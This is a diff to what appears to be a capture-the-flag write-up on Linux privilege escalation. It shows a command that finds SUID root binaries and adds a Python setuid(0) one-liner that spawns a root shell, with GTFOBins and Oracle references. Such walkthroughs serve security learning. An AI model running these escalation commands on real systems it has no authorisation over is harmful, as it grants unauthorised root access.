@@ -59,10 +59,13 @@ dirsearch:
 # Priviledge Escalation
 Found interesting file with SUID permissions that will allow priviledge escalation by typing - ``` find / -user root -perm -4000 2>/dev/null ```
 
-https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatb/index.html
+reference - https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatb/index.html
 
 ![image](https://github.com/user-attachments/assets/40b3717f-6816-4dac-8153-f76aa1866927)
 
+Escalated priviledges to be root user by typing - ``` /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")' ```
 
-https://hacking-capture.github.io/root-me/
-Finding user with different priviledges -``` find / -user root -perm -4000 2>/dev/null ```
+reference - https://gtfobins.github.io/gtfobins/python/
+
+-> All is left to do is cd into root and cat the file.
+
